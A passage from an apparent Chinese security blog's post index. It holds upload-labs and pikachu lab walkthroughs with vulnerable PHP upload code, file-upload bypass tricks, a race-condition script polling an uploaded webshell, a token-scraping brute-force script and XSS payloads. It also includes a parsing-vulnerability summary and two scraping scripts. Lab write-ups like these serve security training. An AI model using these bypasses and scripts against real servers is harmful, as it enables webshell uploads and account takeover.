$_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = '上传出错！';\n        }\n    } else{\n        $msg = \"只允许上传.jpg|.png|.gif类型文件！\";\n    }\n}\n```\n\n- 上传\n白名单,最后的路径是靠拼接,可以使用%00截断\n  原理：php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。\n  \n![](https://raw.githubusercontent.com/chencicici/images/main/202205151404815.png?token=ARYCSAQVS4V5C33H5LH4ZFTCQCMCS)\n\n# pass-13\n- 源码\n```php\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);\n    if(in_array($file_ext,$ext_arr)){\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"上传失败\";\n        }\n    } else {\n        $msg = \"只允许上传.jpg|.png|.gif类型文件！\";\n    }\n}\n\n```\n\n- 上传\n与上关一样,区别是post提交,post不会对里面的数据自动解码，需要在Hex中修改。\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151404058.png?token=ARYCSAVQMXGSSV33V76KGCLCQCMEA)\n  \n#pass-14\n- 源码\n```php\nfunction getReailFileType($filename){\n    $file = fopen($filename, \"rb\");\n    $bin = fread($file, 2); //只读2字节\n    fclose($file);\n    $strInfo = @unpack(\"C2chars\", $bin);    \n    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    \n    $fileType = '';    \n    switch($typeCode){      \n        case 255216:            \n            $fileType = 'jpg';\n            break;\n        case 13780:            \n            $fileType = 'png';\n            break;        \n        case 7173:            \n            $fileType = 'gif';\n            break;\n        default:            \n            $fileType = 'unknown';\n        }    \n        return $fileType;\n}\n\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $file_type = getReailFileType($temp_file);\n\n    if($file_type == 'unknown'){\n        $msg = \"文件未知，上传失败！\";\n    }else{\n        $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type;\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"上传出错！\";\n        }\n    }\n}\n```\n\n- 上传\n会判断强两个字节的来确定上传文件的后缀是否为白名单里的,需要上传图片马配合文件包含漏洞\n  上传图片马\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205151405347.png?token=ARYCSASXZ4555YJ443DI4V3CQCMEU)\n  点击文件包含漏铜\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205151405579.png?token=ARYCSAWV6HXV2F2X3Q5SKV3CQCMFS)\n  \n# pass-15\n- 源码\n```php\nfunction isImage($filename){\n    $types = '.jpeg|.png|.gif';\n    if(file_exists($filename)){\n        $info = getimagesize($filename);\n        $ext = image_type_to_extension($info[2]);\n        if(stripos($types,$ext)>=0){\n            return $ext;\n        }else{\n            return false;\n        }\n    }else{\n        return false;\n    }\n}\n\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $res = isImage($temp_file);\n    if(!$res){\n        $msg = \"文件未知，上传失败！\";\n    }else{\n        $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res;\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"上传出错！\";\n        }\n    }\n}\n\n```\n- 上传\n在上关的基础上,校验图片的大小,依旧可以和上关一样使用图片马绕过\n  \n# pass-16\n- 源码\n```php\nfunction isImage($filename){\n    //需要开启php_exif模块\n    $image_type = exif_imagetype($filename);\n    switch ($image_type) {\n        case IMAGETYPE_GIF:\n            return \"gif\";\n            break;\n        case IMAGETYPE_JPEG:\n            return \"jpg\";\n            break;\n        case IMAGETYPE_PNG:\n            return \"png\";\n            break;    \n        default:\n            return false;\n            break;\n    }\n}\n\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $res = isImage($temp_file);\n    if(!$res){\n        $msg = \"文件未知，上传失败！\";\n    }else{\n        $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$res;\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"上传出错！\";\n        }\n    }\n}\n\n```\n- 上传\n在上关的基础上再检查后缀,依旧使用图片马绕过\n  \n# pass-17\n- 源码\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])){\n    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径\n    $filename = $_FILES['upload_file']['name'];\n    $filetype = $_FILES['upload_file']['type'];\n    $tmpname = $_FILES['upload_file']['tmp_name'];\n\n    $target_path=UPLOAD_PATH.'/'.basename($filename);\n\n    // 获得上传文件的扩展名\n    $fileext= substr(strrchr($filename,\".\"),1);\n\n    //判断文件后缀与类型，合法才进行上传操作\n    if(($fileext == \"jpg\") && ($filetype==\"image/jpeg\")){\n        if(move_uploaded_file($tmpname,$target_path)){\n            //使用上传的图片生成新的图片\n            $im = imagecreatefromjpeg($target_path);\n\n            if($im == false){\n                $msg = \"该文件不是jpg格式的图片！\";\n                @unlink($target_path);\n            }else{\n                //给新图片指定文件名\n                srand(time());\n                $newfilename = strval(rand()).\".jpg\";\n                //显示二次渲染后的图片（使用用户上传图片生成的新图片）\n                $img_path = UPLOAD_PATH.'/'.$newfilename;\n                imagejpeg($im,$img_path);\n                @unlink($target_path);\n                $is_upload = true;\n            }\n        } else {\n            $msg = \"上传出错！\";\n        }\n\n    }else if(($fileext == \"png\") && ($filetype==\"image/png\")){\n        if(move_uploaded_file($tmpname,$target_path)){\n            //使用上传的图片生成新的图片\n            $im = imagecreatefrompng($target_path);\n\n            if($im == false){\n                $msg = \"该文件不是png格式的图片！\";\n                @unlink($target_path);\n            }else{\n                 //给新图片指定文件名\n                srand(time());\n                $newfilename = strval(rand()).\".png\";\n                //显示二次渲染后的图片（使用用户上传图片生成的新图片）\n                $img_path = UPLOAD_PATH.'/'.$newfilename;\n                imagepng($im,$img_path);\n\n                @unlink($target_path);\n                $is_upload = true;               \n            }\n        } else {\n            $msg = \"上传出错！\";\n        }\n\n    }else if(($fileext == \"gif\") && ($filetype==\"image/gif\")){\n        if(move_uploaded_file($tmpname,$target_path)){\n            //使用上传的图片生成新的图片\n            $im = imagecreatefromgif($target_path);\n            if($im == false){\n                $msg = \"该文件不是gif格式的图片！\";\n                @unlink($target_path);\n            }else{\n                //给新图片指定文件名\n                srand(time());\n                $newfilename = strval(rand()).\".gif\";\n                //显示二次渲染后的图片（使用用户上传图片生成的新图片）\n                $img_path = UPLOAD_PATH.'/'.$newfilename;\n                imagegif($im,$img_path);\n\n                @unlink($target_path);\n                $is_upload = true;\n            }\n        } else {\n            $msg = \"上传出错！\";\n        }\n    }else{\n        $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\";\n    }\n}\n\n```\n- 上传\n同上,图片马传就完事了\n  \n# pass-18\n- 源码\n```php\n$is_upload = false;\n$msg = null;\n\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_name = $_FILES['upload_file']['name'];\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $file_ext = substr($file_name,strrpos($file_name,\".\")+1);\n    $upload_file = UPLOAD_PATH . '/' . $file_name;\n\n    if(move_uploaded_file($temp_file, $upload_file)){\n        if(in_array($file_ext,$ext_arr)){\n             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n             rename($upload_file, $img_path);\n             $is_upload = true;\n        }else{\n            $msg = \"只允许上传.jpg|.png|.gif类型文件！\";\n            unlink($upload_file);\n        }\n    }else{\n        $msg = '上传出错！';\n    }\n}\n```\n- 上传\n代码审计,对上传的文件的后缀进行对比,如果不在白名单之内就删除,没有文件包含漏洞,此处利用条件竞争\n  文件上传,再被校验中间是有一个过程的,如果我们在上传后立即访问,占用文件,文件在被使用状态是不可被删除的\n  利用burp重复发包,不设置payload\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151405750.png?token=ARYCSAWD23GMFDRNJYLWY7TCQCMHA)\n  \n  利用脚本去重复访问上传的webshell路径\n```python\nimport requests\n\nwhile True:\n    resp = requests.get(url='http://10.20.146.195/upload/shell.php')\n    if resp.status_code == 200:\n        print('攻击成功')\n        break\n    else:\n        continue\n```\n\n# pass-19\n- 源码\n```php\n//index.php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit']))\n{\n    require_once(\"./myupload.php\");\n    $imgFileName =time();\n    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);\n    $status_code = $u->upload(UPLOAD_PATH);\n    switch ($status_code) {\n        case 1:\n            $is_upload = true;\n            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;\n            break;\n        case 2:\n            $msg = '文件已经被上传，但没有重命名。';\n            break; \n        case -1:\n            $msg = '这个文件不能上传到服务器的临时文件存储目录。';\n            break; \n        case -2:\n            $msg = '上传失败，上传目录不可写。';\n            break; \n        case -3:\n            $msg = '上传失败，无法上传该类型文件。';\n            break; \n        case -4:\n            $msg = '上传失败，上传的文件过大。';\n            break; \n        case -5:\n            $msg = '上传失败，服务器已经存在相同名称文件。';\n            break; \n        case -6:\n            $msg = '文件无法上传，文件不能复制到目标目录。';\n            break;      \n        default:\n            $msg = '未知错误！';\n            break;\n    }\n}\n\n//myupload.php\nclass MyUpload{\n......\n......\n...... \n  var $cls_arr_ext_accepted = array(\n      \".doc\", \".xls\", \".txt\", \".pdf\", \".gif\", \".jpg\", \".zip\", \".rar\", \".7z\",\".ppt\",\n      \".html\", \".xml\", \".tiff\", \".jpeg\", \".png\" );\n\n......\n......\n......  \n  /** upload()\n   **\n   ** Method to upload the file.\n   ** This is the only method to call outside the class.\n   ** @para String name of directory we upload to\n   ** @returns void\n  **/\n  function upload( $dir ){\n    \n    $ret = $this->isUploadedFile();\n    \n    if( $ret != 1 ){\n      return $this->resultUpload( $ret );\n    }\n\n    $ret = $this->setDir( $dir );\n    if( $ret != 1 ){\n      return $this->resultUpload( $ret );\n    }\n\n    $ret = $this->checkExtension();\n    if( $ret != 1 ){\n      return $this->resultUpload( $ret );\n    }\n\n    $ret = $this->checkSize();\n    if( $ret != 1 ){\n      return $this->resultUpload( $ret );    \n    }\n    \n    // if flag to check if the file exists is set to 1\n    \n    if( $this->cls_file_exists == 1 ){\n      \n      $ret = $this->checkFileExists();\n      if( $ret != 1 ){\n        return $this->resultUpload( $ret );    \n      }\n    }\n\n    // if we are here, we are ready to move the file to destination\n\n    $ret = $this->move();\n    if( $ret != 1 ){\n      return $this->resultUpload( $ret );    \n    }\n\n    // check if we need to rename the file\n\n    if( $this->cls_rename_file == 1 ){\n      $ret = $this->renameFile();\n      if( $ret != 1 ){\n        return $this->resultUpload( $ret );    \n      }\n    }\n    \n    // if we are here, everything worked as planned :)\n\n    return $this->resultUpload( \"SUCCESS\" );\n  \n  }\n......\n......\n...... \n};\n\n```\n同上一关,但是在上一关的基础上,对文件名进行修改,需要配合文件包含漏洞或其他漏洞\n绕过白名单过滤：利用apache的后缀名识别漏洞 —— 从右往左依次识别后缀，遇到不能识别的后缀名便跳过 ，因此可以文件名改为create.php.7z（.7z这个后缀apache不能识别）\n\n\n# pass-20\n- 源码\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");\n\n        $file_name = $_POST['save_name'];\n        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);\n\n        if(!in_array($file_ext,$deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' .$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) { \n                $is_upload = true;\n            }else{\n                $msg = '上传出错！';\n            }\n        }else{\n            $msg = '禁止保存为该类型文件！';\n        }\n\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n- 上传\n黑名单,会对文件名重命名,双写,大小写都可以绕过\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151405930.png?token=ARYCSATJRWMONW5XYBJMCCTCQCMIA)\n  \n# pass-21\n\n- 源码\n```php\n$is_upload = false;\n$msg = null;\nif(!empty($_FILES['upload_file'])){\n    //检查MIME\n    $allow_type = array('image/jpeg','image/png','image/gif');\n    if(!in_array($_FILES['upload_file']['type'],$allow_type)){\n        $msg = \"禁止上传该类型文件!\";\n    }else{\n        //检查文件名\n        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];\n        if (!is_array($file)) {\n            $file = explode('.', strtolower($file));\n        }\n\n        $ext = end($file);\n        $allow_suffix = array('jpg','png','gif');\n        if (!in_array($ext, $allow_suffix)) {\n            $msg = \"禁止上传该后缀文件!\";\n        }else{\n            $file_name = reset($file) . '.' . $file[count($file) - 1];\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' .$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $msg = \"文件上传成功！\";\n                $is_upload = true;\n            } else {\n                $msg = \"文件上传失败！\";\n            }\n        }\n    }\n}else{\n    $msg = \"请选择要上传的文件！\";\n}\n```\n\n- 上传\n检查MIME和白名单,以`.`切割为数组,取数组最后一个元素来校验是否在白名单内,再取数组数-1来重命名后缀\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151406269.png?token=ARYCSATYTCCNBOWEHY3CJF3CQCMI4)","tags":["web漏洞","upload"],"categories":["靶场"]},{"title":"利用爬虫定时给女友发送暖心邮件","url":"/2022/05/11/利用爬虫定时给女友发送暖心邮件/","content":"\n爬取墨迹天气,土味情话,ONE每日图片定时发送邮件\n\n\n```python\n\nimport smtplib\nimport time\nfrom email.mime.text import MIMEText\nimport requests\nfrom lxml import etree\nimport datetime\nfrom fake_useragent import UserAgent\n\nsender_maile = ''  # 发件人地址\nsender_pass = ''  # 邮件授权码\nboy_name = ''  # 发件人姓名\ngirl_name = ''  # 收件人姓名\nmaile_obj = smtplib.SMTP_SSL('smtp.qq.com', 465)  # 发送的服务器\nreceiver_mail = ''  # 收件人邮箱\nspecial_day = ''  # 纪念日\nprovince = ''  # 省份 墨迹天气官网查看 示例province = 'guangxi'\ncity = ''  # 城市 示例city = 'jiangnan-district' \ntitle = 's'  # 邮件主题\nua = UserAgent()\nheader = {\n    'Referer': 'https://tianqi.moji.com/weather/china/guangxi', # 根据城市修改\n    'User-Agent': ua.random\n}\n\nsession = requests.session()\n\n\n# 获取纪念日距今多少天\ndef get_day():\n    d1 = datetime.datetime.strptime(special_day, '%Y-%m-%d')\n    d2 = datetime.datetime.strptime(datetime.datetime.now().strftime('%Y-%m-%d'), '%Y-%m-%d')\n    delta = d2 - d1\n    return delta.days\n\n\n# 获取每日土味情话\ndef get_chp():\n    url =  \"https://api.lovelive.tools/api/SweetNothings\"\n    resp = requests.get(url=url)\n    return resp.text\n\n\n# 获取提醒\ndef get_weathertip():\n    try:\n        url = f'https://tianqi.moji.com/weather/china/{province}/{city}'\n        resp = session.get(url=url, headers=header, verify=False)\n        html = etree.HTML(resp.text)\n        em = html.xpath('/html/body/div[4]/div[1]/div[4]/em/text()')[0]\n        return em\n    except:\n        return False\n\n\n# 获取每日天气\ndef get_weather():\n    try:\n        url = f'https://tianqi.moji.com/weather/china/{province}/{city}'\n        resp = session.get(url=url, headers=header,  verify=False)\n        html = ''\n        htmls = etree.HTML(resp.text)\n        ul = htmls.xpath('/html/body/div[5]/div[1]/div[1]/ul')\n        for lis in ul:\n            # 获取日期\n            day = lis.xpath('./li[1]/a/text()')[0]\n            # 获取天气图标\n            src = lis.xpath('./li[2]/span/img/@src')[0]\n            # 获取天气状况\n            weather = lis.xpath('./li[2]/span/img/@alt')[0]\n            # 获取温度\n            temperature = lis.xpath('./li[3]/text()')[0]\n            # 获取空气质量\n            air = lis.xpath('./li[5]/strong/text()')[0].strip()\n            # 获取空气质量对应的字体颜色\n            color = str(lis.xpath('./li[5]/strong/@class')[0])\n            # 判断字体颜色\n            if color == 'level_1':\n                color = '#8fc31f'\n            elif color == 'level_2':\n                color = '#d7af0e'\n            elif color == 'level_3':\n                color = '#f39800'\n            elif color == 'level_4':\n                color = '#e2361a'\n            elif color == 'level_5':\n                color = '#5f52a0'\n            elif color == 'level_6':\n                color = '#631541'\n            html += \"\"\"<div style=\"display: flex;margin-top:5px;height: 30px;line-height: 30px;justify-content: space-around;align-items: center;\">\n            <span style=\"width:15%%; text-align:center;\">%s</span>\n            <div style=\"width:10%%; text-align:center;\">\n                <img style=\"height:26px;vertical-align:middle;\" src='%s' alt=\"\">\n            </div>\n            <span style=\"width:25%%; text-align:center;\">%s</span>\n            <div style=\"width:35%%; \">\n                <span style=\"display:inline-block;padding:0 8px;line-height:25px;color:%s; border-radius:15px; text-align:center;\">%s</span>\n            </div>\n            </div>\n            \"\"\" % (day, src, temperature, color, air)\n        return html\n    except:\n        return False\n\n\n# 获取图片\ndef get_image():\n    url = \"http://wufazhuce.com/\"\n    resp = requests.get(url=url)\n    html = etree.HTML(resp.text)\n    img_url = html.xpath('//*[@id=\"carousel-one\"]/div/div[1]/a/img/@src')[0]\n    return img_url\n\n\n# 获取当天日期\ndef get_today():\n    i = datetime.datetime.now()\n    date = \"%s/%s/%s\" % (i.year, i.month, i.day)\n    return date\n\n\nmail_content = \"\"\"<!DOCTYPE html>\n                <html>\n\n                <head>\n                    <title>\n                    </title>\n                    <meta name=\"viewport\" content=\"width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\">\n                    <meta charset=\"UTF-8\">\n                </head>\n\n                <body style=\"margin:0;padding:0;\">\n                    <div style=\"width:100%; margin: 40px auto;font-size:20px; color:#5f5e5e;text-align:center\">\n                        <span>今天是我们在一起的第</span>\n                        <span style=\"font-size:24px;color:rgb(221, 73, 73)\"  >{0}</span>\n                        <span>天</span>\n                    </div>\n                    <div style=\"width:100%; margin: 0 auto;color:#5f5e5e;text-align:center\">\n                        <span style=\"display:block;color:#676767;font-size:20px\">{2}</span>\n                        <br>\n                        <span style=\"display:block;color:#676767;font-size:20px\">{1}</span>\n                        <span style=\"display:block;margin-top:15px;color:#676767;font-size:15px\">近期天气预报</span>\n                {3}\n                    </div>\n                    <div style=\"text-align:center;margin:35px 0;\">\n                            <span style=\"display:block;margin-top:55px;color:#676767;font-size:15px\">{4} ❤️ {5}</span>\n                            <span style=\"display:block;margin-top:25px;font-size:22px; color:#9d9d9d; \">{6}</span>\n                             <img src='{7}' style=\"width:100%;margin-top:10px;\"  alt=\"\">\n                    </div>\n                </body>\n\n                </html>\"\"\".format(str(get_day()), get_weathertip(), get_chp(), get_weather(), boy_name, girl_name,\n                                  get_today(), get_image())\n\n\n# 发送邮件\ndef send_mail():\n    try:\n        maile_obj.login(sender_maile, sender_pass)\n        # 三个参数分别是发件人邮箱账号,收件人账号,发送的邮件内容\n        msg = MIMEText(mail_content, _subtype='html', _charset='utf-8')\n        msg['Subject'] = title\n        msg['From'] = \"发送人名称\"\n        msg['To'] = \"接收人名称\"\n        maile_obj.sendmail(sender_maile, receiver_mail, msg.as_string())\n        maile_obj.quit()\n        return True\n    except smtplib.SMTPException as e:\n        return False\n\n\nif __name__ == '__main__':\n    send_mail()\n    print('发送成功!')\n    theTime = datetime.datetime.now()\n    print(theTime)\n\n\n```\n\n效果\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151434500.png?token=ARYCSAQPCUTWVPSDZCCU65LCQCPT2)","tags":["requests"],"categories":["爬虫"]},{"title":"有道翻译逆向","url":"/2022/05/07/有道翻译逆向/","content":"\njs源码\n```js\ndefine(\"newweb/common/service\", [\"./utils\", \"./md5\", \"./jquery-1.7\"], function(e, t) {\n    var n = e(\"./jquery-1.7\");\n    e(\"./utils\");\n    e(\"./md5\");\n    var r = function (e) {\n        var t = n.md5(navigator.appVersion)\n            , r = \"\" + (new Date).getTime()\n            , i = r + parseInt(10 * Math.random(), 10);\n        return {\n            ts: r,\n            bv: t,\n            salt: i,\n            sign: n.md5(\"fanyideskweb\" + e + i + \"Ygy_4c=r#e#4EX^NUGUc5\")\n        }\n};\n// e = 翻译的字符串, i = 字符串形式的js时间戳+一位整数\n```\n\npython实现代码\n```python\n\nimport time\nimport hashlib\nimport requests\n\ndef get_fanyi(word):\n    # 13位时间戳\n    lts = str(int(time.time() * 1000))\n    # 时间戳+一个随机整数\n    salt = str(int(time.time() * 10000))\n    # 写死的两个参数+翻译的字符+salt\n    sign = \"fanyideskweb\" + word + salt + \"Y2FYu%TNSbMCxc3t2u^XT\"\n    # md5 加密字符\n    sign = hashlib.md5(sign.encode()).hexdigest()\n\n    data = {\"i\": word,\n            \"from\": \"AUTO\",\n            \"to\": \"AUTO\",\n            \"smartresult\": \"dict\",\n            \"client\": \"fanyideskweb\",\n            # 时间戳14位\n            \"salt\": salt,\n            # 加密的数据\n            \"sign\": sign,\n            # 时间戳13位\n            \"lts\": lts,\n            \"bv\": 'd771cbe0c376715add7059261c9e06bd',\n            \"doctype\": \"json\",\n            \"version\": \"2.1\",\n            \"keyfrom\": \"fanyi.web\",\n            \"action\": \"FY_BY_REALTlME\"\n            }\n    url = 'https://fanyi.youdao.com/translate_o?smartresult=dict&smartresult=rule'\n    header = {\n        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',\n        'Referer': 'https://fanyi.youdao.com/',\n        'cookie': 'OUTFOX_SEARCH_USER_ID=-1711366876@10.108.160.105; OUTFOX_SEARCH_USER_ID_NCOO=528854206.9578509; '\n                  'fanyi-ad-closed=0; JSESSIONID=aaab35aMiB_2j8wyyH0-x; fanyi-ad-id=305426; '\n                  '___rl__test__cookies=1649078361368 '\n    }\n    resp = requests.post(url=url, headers=header, data=data)\n    print(resp.json()['translateResult'][0][0]['tgt'])\n\n\nif __name__ == '__main__':\n    get_fanyi('dog')\n\n```","tags":["爬虫","逆向"],"categories":["js逆向"]},{"title":"中间件解析漏洞总结","url":"/2022/05/01/中间件解析漏洞总结/","content":"# 服务器解析漏洞\n\n    服务器解析漏洞一般是服务器自身或扩展组件带来的漏洞，配合文件上传等漏洞就会产生很大的危害。\n    我们这里整理常见的服务器apache、IIS、nginx的解析漏洞。\n\n# apache\n\n- 一、不可识别解析\n\napache解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。\n比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。\napache版本在以下范围内\nApache 2.0.x <= 2.0.59 Apache 2.2.x <= 2.2.17 Apache 2.2.2 <= 2.2.8 都可以通过上传xxx.php.rar或xxx.php+任意无法解析后缀解析为php。\n- 二、配置问题\n\n1.如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。\n2.如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。\n- 三、罕见后缀\n\nApache配置文件中会有.+.ph(p[345]?|t|tml)此类的正则表达式，被当php程序执行的文件名要符合正则表达式。也就是说php3，php4，php5，pht，phtml等文件后缀也是可以被当作php文件进行解析的。\n- 四、后缀包含换行符\\x0A\n\nCVE-2017-15715：Apache 2.4.0-2.4.29中，上传一个后缀末尾包含换行符的文件，来绕过FilesMatch。绕过FilesMatch不一定能被PHP解析。\n# IIS\n\n- 一、目录解析\n\n在IIS-6.0的版本，在.asp或.asa文件夹下的所有类型后缀文件全部解析为.asp文件。\n存在数据库备份功能的系统并且备份路径可控的话经常会出现这个问题。\n- 二、文件解析\n\n在IIS-6.0的版本，服务器默认不解析;后面的内容，所以xxx.asp;.jpg会被解析成xxx.asp。\n- 三、其他解析类型\n\n在IIS6.0的版本，如下几种文件类型也会被执行。\nxxx.asa xxx.cer xxx.cdx\n- 四、php-cgi漏洞\n\n在IIS-7.0和IIS-7.5的版本，在php配置文件中，开启cgi.fix_pathinfo，然后上传一个1.jpg的一句话木马文件。然后用菜刀访问1.jpg/.php即可连接一句话木马。\n# nginx\n\n- 一、低版本nginx\n空字节代码执行漏洞：nginx 0.5.x、nginx 0.6.x、Nginx 0.7-0.7.65、Nginx 0.8-0.8.37中可以通过在任意文件名后面增加%00.php解析为php，如1.jpg%00.php\n\n- 二、php-cgi漏洞\n和IIS的第四点相同，在php配置文件中，开启了cgi.fix_pathinfo，导致图片马1.jpg可以通过访问1.jpg/.php、1.jpg%00.php解析成php文件\n  \n\n# windows解析漏洞\nWindows操作系统中，文件名不能以空格或.开头，也不能以空格或.结尾。\n当把一个文件命名为以空格或.开头或结尾时，会自动地去掉开头和结尾处的空格和.。利用此特性，也可能造成文件解析漏洞\n\n# 应对\n\n1. 对于php-cgi漏洞，可以修改php.ini文件，将cgi.fix_pathinfo的值设置为0\n2. 使用白名单匹配文件后缀名\n3. 可以对上传后的文件固定后缀，并对之前的所有字符进行重命名\n作者：Leticia's Blog ，详情点击阅读[原文](https://uuzdaisuki.com/2018/05/01/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/)。","tags":["解析漏洞"],"categories":["笔记"]},{"title":"pikachu漏洞靶场通关","url":"/2022/04/28/pikachu漏洞靶场通关/","content":"# 暴力破解\n\n## 基于表单的暴力破解\n抓取登录数据包\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291529117.png)\n\n发送到intruder模块,设置爆破的参数\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291531603.png)\n\n设置payload\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291532226.png)\n\n开始爆破,从返回数据包长度判断爆破结果\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291534944.png)\n\n\n## 绕过验证码(Server)\n抓包分析,可以看到账号密码,验证码都正确会回显success\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291537345.png)\n\n替换一个不存在的账号继续发包\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291539745.png)\n\n仅提示账号不存在,说明验证码长期有效,可以爆破,爆破过程和上关一样\n\n## 绕过验证码(client\n抓包分析,刚开始输错了几次,发现校验是在前端\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291543457.png)\n不用说了,直接爆破\n\n## token防爆破\n抓包分析\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291545789.png)\n\n随机生成token来校验数据包的唯一性,理论上是无法重复发包的,也就无法进行爆破,但是这里token回显在了前端\n在分析数据包的时候,可以观察一些特定的变量名,很多key都藏在网页源码里\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291546774.png)\n\n自动脚本\n实现抓取key,并进行爆破\n```python\nimport requests\nfrom lxml import etree\n\n# 密码字典\npass_dict = ['123', '456', '123456']\nsession = requests.Session()\nfor pwd in pass_dict:\n    # 抓取token\n    resp = session.get(url='http://10.20.146.195:8080/vul/burteforce/bf_token.php')\n    html = etree.HTML(resp.text)\n    token = html.xpath('//*[@id=\"bf_client\"]/input/@value')[0]\n    # 构造请求参数\n    data = {\n        'username': 'admin',\n        'password': pwd,\n        'token': token,\n        'submit': 'Login'\n    }\n    resp = session.post('http://10.20.146.195:8080/vul/burteforce/bf_token.php', data=data)\n    # 判断结果\n    if \"success\" in resp.text:\n        print('爆破成功', pwd)\n```\n\n\n# xss\n    Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写\"CSS\"冲突，故又称XSS。一般XSS可以分为如下几种常见类型：\n        1.反射性XSS;\n        2.存储型XSS;\n        3.DOM型XSS;\n        XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。\n        XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。\n        形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。\n        因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:\n          输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;\n          输出转义：根据输出点的位置对输出到前端的内容进行适当转义;\n\n## 反射型XSS(GET)\n对输入长度有限制,直接在url里插入js代码\n\n- payload\n    ```js\n    <script>alert(1)</script>\n    ```\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202205221450440.png)\n\n\n\n## 反射型XSS(POST) \n抓包插入js\n\n- payload\n    ```js\n    <script>alert(1)</script>\n    ```\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202205221506374.png)\n\n\n## 存储性XSS\n和上关一样,区别就是这个是长久存在的\n\n- 